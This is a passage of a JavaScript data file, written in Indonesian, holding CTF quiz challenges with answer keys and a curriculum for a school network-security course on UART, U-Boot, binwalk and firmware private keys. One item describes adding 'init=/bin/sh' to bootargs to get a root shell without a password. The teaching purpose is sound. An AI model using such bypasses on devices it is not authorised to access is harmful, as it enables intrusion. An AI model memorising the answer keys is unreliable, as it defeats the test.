    hint: 'Pin pemasok tegangan daya positif.',
    explain: 'Pin VCC tidak dihubungkan karena perangkat router sudah mendapatkan daya dari catu dayanya sendiri.'
  },
  {
    id: 57,
    topic: 'Hardware & IoT Security',
    category: 'Hardware',
    title: 'Penyesuaian Baud Rate Terminal Serial Hardware',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Mengatasi keluaran karakter aneh (gibberish/garbled text) pada komunikasi serial dengan menyamakan kecepatan baud rate.',
    lesson: 'UART tidak memiliki jalur clock eksternal (asynchronous). Keduanya harus menyepakati kecepatan clock sampling yang persis sama. Jika baud rate tidak cocok, teks akan terbaca karakter acak atau rusak.',
    details: [
      { title: 'Baud Rate Standar Industri', content: 'Nilai paling umum pada perangkat embedded router & Linux IoT adalah 115200 bps (bits per second).' }
    ],
    audioText: 'Kasus lima puluh tujuh: Baud Rate Hardware. Berapakah kecepatan baud rate standar paling populer yang digunakan pada serial console router industri?',
    task: 'Berapakah nilai kecepatan baud rate standar (dalam bps) yang paling umum digunakan untuk mengakses serial console perangkat router jaringan dan IoT?',
    answers: ['115200', '115200 bps', '115200bps'],
    hint: 'Kecepatan serial modern di atas 9600, yaitu seratus lima belas ribu dua ratus.',
    explain: '115200 bps adalah nilai baud rate standar industri untuk antarmuka serial console mikrokontroler dan router.'
  },
  {
    id: 58,
    topic: 'Hardware & IoT Security',
    category: 'Hardware',
    title: 'Interrupsi Siklus Bootloader Embedded (U-Boot)',
    difficulty: 'Sulit (High)',
    points: 250,
    summary: 'Menghentikan hitung mundur booting firmware untuk masuk ke shell interaktif bootloader hardware.',
    lesson: 'U-Boot (Universal Boot Loader) memberikan jendela waktu 1–3 detik saat perangkat pertama kali dinyalakan (Hit any key to stop autoboot). Mengirimkan karakter interupsi memberi akses ke perintah memori md, mm, dan bootargs.',
    details: [
      { title: 'Manipulasi Bootargs', content: 'Menambahkan <code>init=/bin/sh</code> pada bootargs memberikan shell root tanpa meminta kata sandi admin web.' }
    ],
    audioText: 'Kasus lima puluh delapan: Interrupsi Bootloader. Nama perangkat lunak bootloader embedded open-source apakah yang paling populer digunakan pada router jaringan?',
    task: 'Apakah nama software bootloader embedded open-source yang paling umum digunakan pada perangkat keras router dan sistem embedded Linux?',
    answers: ['U-Boot', 'Das U-Boot', 'u-boot', 'uboot'],
    hint: 'Diawali huruf U dan diikuti kata Boot.',
    explain: 'U-Boot adalah bootloader standar industri yang memuat kernel Linux pada arsitektur ARM dan MIPS.'
  },
  {
    id: 59,
    topic: 'Hardware & IoT Security',
    category: 'Hardware',
    title: 'Ekstraksi Filesystem Firmware IoT (SquashFS & Binwalk)',
    difficulty: 'Sulit (High)',
    points: 250,
    summary: 'Membedah berkas image binary firmware router menggunakan utilitas analisis tanda tangan Binwalk.',
    lesson: 'Firmware perangkat jaringan umumnya menggabungkan header bootloader, kernel biner, dan sistem berkas terkompresi SquashFS. Binwalk memindai pola magic bytes dan mengekstrak filesystem rootfs secara otomatis.',
    details: [
      { title: 'Perintah Binwalk', content: '<code>binwalk -eM firmware.bin</code> mengekstrak seluruh partisi dan berkas SquashFS secara rekursif.' }
    ],
    audioText: 'Kasus lima puluh sembilan: Ekstraksi Firmware. Utilitas baris perintah apakah yang paling populer digunakan untuk menganalisis dan membongkar berkas firmware router?',
    task: 'Utilitas perangkat lunak baris perintah apakah yang menjadi standar industri forensik hardware untuk memindai dan mengekstrak komponen image firmware biner?',
    answers: ['binwalk', 'Binwalk'],
    hint: 'Gabungan kata binary dan walk.',
    explain: 'Binwalk dirancang khusus untuk membedah dan mengekstrak sistem berkas tertanam (seperti SquashFS dan CramFS) dari berkas image firmware.'
  },
  {
    id: 60,
    topic: 'Hardware & IoT Security',
    category: 'Hardware',
    title: 'Audit Kunci RSA Privat & Kredensial Hardcoded Firmware',
    difficulty: 'Sulit (High)',
    points: 300,
    summary: 'Menemukan kunci sertifikat privat dan backdoor password vendor yang tertinggal di dalam berkas konfigurasi firmware.',
    lesson: 'Vendor perangkat keras sering meninggalkan kunci privat SSL/SSH (seperti /etc/ssl/private/server.key) yang sama di jutaan perangkat yang diproduksi massal. Penyerang dapat melakukan dekripsi lalu lintas secara luas.',
    details: [
      { title: 'Header Kunci Privat', content: 'Diawali baris <code>-----BEGIN RSA PRIVATE KEY-----</code> atau <code>-----BEGIN PRIVATE KEY-----</code>.' }
    ],
    audioText: 'Kasus enam puluh: Audit Firmware Kunci Privat. Baris pembuka standar apakah yang menandai keberadaan berkas kunci privat enkripsi RSA?',
    task: 'String teks standar apakah yang selalu tercantum pada baris paling awal dari sebuah berkas kunci privat enkripsi RSA dalam format PEM?',
    answers: ['-----BEGIN RSA PRIVATE KEY-----', 'BEGIN RSA PRIVATE KEY', '-----BEGIN PRIVATE KEY-----'],
    hint: 'Diawali tanda minus berulang dan kata BEGIN RSA PRIVATE KEY.',
    explain: 'Semua kunci privat RSA berformat PEM diawali dengan blok header -----BEGIN RSA PRIVATE KEY-----.'
  }
];

// Data Kurikulum Merdeka TJKT Default (Bisa Diedit Guru & Disimpan ke Supabase)
const defaultCurriculum = {
  programKeahlian: 'Teknik Jaringan Komputer dan Telekomunikasi (TJKT)',
  kurikulum: 'Kurikulum Merdeka SMK Kejuruan',
  tujuanPembelajaran: [
    {
      kode: 'TP-01',
      bidang: 'Administrasi Sistem Server & Linux',
      deskripsi: 'Peserta didik mampu mengoperasikan sistem operasi jaringan berbasis Linux, mengelola hak akses perizinan berkas (chmod/chown), mendeteksi dotfiles, serta mengaudit konfigurasi layanan server.'
    },
    {
      kode: 'TP-02',
      bidang: 'Keamanan Jaringan & Firewall',
      deskripsi: 'Peserta didik mampu menganalisis lalu lintas data protokol TCP/UDP, membaca log firewall (iptables), memahami konsep port knocking, dan memitigasi serangan brute-force.'
    },
    {
      kode: 'TP-03',
      bidang: 'Keamanan Aplikasi Web & Otorisasi',
      deskripsi: 'Peserta didik mampu mendeteksi kerentanan kritis OWASP Top 10 seperti SQL Injection, manipulasi cookie sesi tanpa tanda tangan digital, dan directory traversal (LFI).'
    },
    {
      kode: 'TP-04',
      bidang: 'Kriptografi & Forensik Digital',
      deskripsi: 'Peserta didik mampu membedakan encoding vs enkripsi, melakukan kriptoanalisis XOR known-plaintext, mendekonstruksi payload reverse shell obfuscated, dan menguji ketahanan hash MD5.'
    },
    {
      kode: 'TP-05',
      bidang: 'Hardware & Embedded Network Systems',
      deskripsi: 'Peserta didik mampu memahami antarmuka fisik perangkat jaringan (router/IoT), pengkabelan serial UART console, dan penyesuaian baud rate untuk mitigasi eksploitasi fisik.'
    }
  ],
  manfaatCTF: [
    'Hands-on Lab Terisolasi: Siswa bereksperimen langsung dengan terminal simulasi tanpa risiko merusak server sekolah nyata.',
    'Pembelajaran Berbasis Tantangan (Challenge-Based Learning): Menumbuhkan Higher Order Thinking Skills (HOTS), daya analisa, dan ketelitian investigasi.',
    'Penyelarasan Kompetensi Industri: Mempersiapkan siswa menghadapi sertifikasi kejuruan (MikroTik MTCNA, Linux Essentials, CompTIA Security+).'
  ],
  tingkatKesulitan: [
    { level: 'Dasar (Low)', xp: '100 XP', deskripsi: 'Perintah dasar navigasi Linux, berkas tersembunyi, port standar IANA, decoding teks dasar.' },
    { level: 'Sedang (Medium)', xp: '150 - 200 XP', deskripsi: 'Eskalasi hak akses SUID, manipulasi cookie session web, SQLi bypass, LFI traversal, cracking hash.' },
    { level: 'Sulit (High)', xp: '200 - 300 XP', deskripsi: 'Analisis log port knocking firewall, XOR cryptanalysis, deobfuscation malware reverse shell, hardware UART baud rate, celah GTFOBins sudoers.' }
  ]
};

module.exports = { baseChallenges, defaultCurriculum };
